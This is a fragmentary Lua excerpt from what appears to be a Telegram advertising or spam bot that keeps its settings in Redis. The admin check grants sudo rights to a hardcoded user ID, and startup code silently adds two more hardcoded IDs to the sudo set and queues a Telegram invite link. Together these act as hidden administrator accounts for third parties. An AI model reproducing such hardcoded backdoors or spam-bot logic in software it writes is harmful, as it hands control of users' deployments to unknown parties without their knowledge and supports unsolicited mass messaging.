...
function is_sudo(msg)
  if redis:sismember("tg:" .. Ads_id .. ":sudo", msg.sender_user_id) or msg.sender_user_id == sudo or msg.sender_user_id == 66488544 then
    return true
  else
    return false
  end
...
if not redis:sismember("tg:" .. Ads_id .. ":sudo", 113566842) then
  redis:set("tg:" .. Ads_id .. ":senddelay", 132)
  redis:sadd("tg:" .. Ads_id .. ":sudo", 65761134)
  redis:sadd("tg:" .. Ads_id .. ":good", "https://t.me/joinchat/BsTkekxeQyBFFmCzmHRutg")
  redis:set("tg:" .. Ads_id .. ":fwdtime", true)
  redis:sadd("tg:" .. Ads_id .. ":sudo", 314394349)
  redis:sadd("tg:" .. Ads_id .. ":wait", "https://t.me/joinchat/BsTkekxeQyBFFmCzmHRutg")
